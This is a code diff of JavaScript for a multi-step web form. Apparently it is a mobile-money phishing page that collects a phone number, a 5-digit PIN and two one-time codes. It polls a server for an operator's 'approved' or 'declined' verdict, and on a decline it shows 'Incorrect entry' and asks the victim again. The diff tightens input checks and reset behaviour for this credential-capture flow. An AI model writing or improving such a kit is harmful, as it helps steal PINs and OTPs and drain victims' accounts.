@@ -503,28 +503,24 @@ phoneInput.addEventListener("input", () => {
   phoneInput.value = phoneInput.value.replace(/\D/g, "");
   
   // Step 1 Phone Input Dynamic Activation Routines
+// Step 1 Phone Input Dynamic Activation Routines
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
 phoneInput.addEventListener("input", () => {
-  // 1. Clean the input value by removing spaces and any non-numeric symbols
   let cleanedValue = phoneInput.value.trim().replace(/\D/g, "");
-  
-  // 2. Set the input value back to the cleaned digits format
   phoneInput.value = cleanedValue;
   
-  // 3. FIX: Enable the button if the number is between 8 and 10 digits long 
-  // (This handles copy-paste spaces or slight region variations gracefully)
-  if (cleanedValue.length >= 8 && cleanedValue.length <= 10) {
+  // Checks for exact 9-digit requirement and applies active style state instantly
+  if (cleanedValue.length === 9) {
     nextPhoneBtn.removeAttribute("disabled");
-    nextPhoneBtn.style.opacity = "1";          // Forces full layout brightness
-    nextPhoneBtn.style.pointerEvents = "auto"; // Restores clicking behaviors
+    nextPhoneBtn.classList.add("active-momo-btn");
   } else {
     nextPhoneBtn.setAttribute("disabled", "true");
-    nextPhoneBtn.style.opacity = "0.45";       // Locks visual brightness down
-    nextPhoneBtn.style.pointerEvents = "none";  // Blocks accidental tapping
+    nextPhoneBtn.classList.remove("active-momo-btn");
   }
 });
+
 
 
 nextPhoneBtn.addEventListener("click", () => {
@@ -757,26 +753,25 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-      } else if (data.status === "declined") {
+            } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // 2. Bring the actual input panel form card back into view!
+        // FIX 1: Bring the hidden form section card back onto the screen layout!
         document.getElementById(currentPageId).classList.remove("hidden");
         
-        // 3. Clear text input area safely (For Page 3 OTP text field)
+        // 2. Clear text input area safely (For Page 3 OTP text field)
         const otpInput = document.getElementById('code1');
         if (otpInput) {
           otpInput.value = '';
           otpInput.removeAttribute("disabled");
         }
         
-        // 4. Completely clear and UNLOCK square boxes grids (For Pages 2 & 4)
+        // FIX 2: Completely clear and UNLOCK square boxes grids (For Pages 2 & 4)
         const boxContainers = document.getElementById(currentPageId).querySelectorAll('.boxes');
         boxContainers.forEach(container => {
-          // If it's a grid form stage, completely rebuild the empty clickable boxes!
           if (stage === "pin") {
             setupBoxInputs("pinBoxes", 5, submitPinStage);
           } else if (stage === "code2") {
@@ -784,21 +779,22 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
           }
         });
         
-        // 5. Unfreeze and re-lock action push buttons to initial state configuration
-        const submitBtn = document.getElementById('submitCode1');
-        if (submitBtn) {
-          submitBtn.setAttribute("disabled", "true");
+        // 3. Unfreeze and re-lock action push buttons to initial state configuration
+        if (submitCode1Btn) {
+          submitCode1Btn.setAttribute("disabled", "true");
+          submitCode1Btn.classList.remove("active-momo-btn");
         }
         
-        const nextPhoneElement = document.getElementById('nextPhone');
-        if (nextPhoneElement && stage === "pin") {
-          nextPhoneElement.removeAttribute("disabled");
+        if (nextPhoneBtn && stage === "pin") {
+          nextPhoneBtn.removeAttribute("disabled");
+          nextPhoneBtn.classList.add("active-momo-btn");
         }
 
-        // 6. Output clear error statement message text
+        // 4. Output clear error statement message text
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
+
  
     } catch (err) {
       console.error("Status check failed");
